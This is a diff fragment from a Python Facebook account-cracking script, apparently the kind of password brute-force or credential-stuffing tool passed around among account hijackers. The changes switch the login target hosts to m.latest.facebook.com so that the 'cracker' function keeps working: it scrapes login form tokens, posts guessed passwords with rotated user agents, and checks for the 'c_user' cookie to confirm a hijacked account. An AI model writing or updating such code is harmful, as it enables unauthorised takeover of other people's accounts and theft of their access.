@@ -2431,7 +2431,7 @@ def cracker(uid, pwx, tl):
             ua = random.choice(uas)
             pro = random.choice(SUMONua)
             ses = requests.Session()
-            p_fb = ses.get("https://mbasic.facebook.com").text
+            p_fb = ses.get("https://m.latest.facebook.com").text
             lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
             jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
             m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
@@ -2448,7 +2448,7 @@ def cracker(uid, pwx, tl):
                 "login": "Log In",
             }
             headers = {
-            'Host': 'mbasic.facebook.com',
+            'Host': 'm.latest.facebook.com',
             'method': 'POST',
             'path': '/login/SUMONice-based/login/async/',
             'scheme': 'https',
@@ -2478,7 +2478,7 @@ def cracker(uid, pwx, tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://web.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
+            url = "https://m.latest.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
             po = ses.post(url, data=data, headers=headers).text
             response = ses.cookies.get_dict().keys()
             if "c_user" in response:
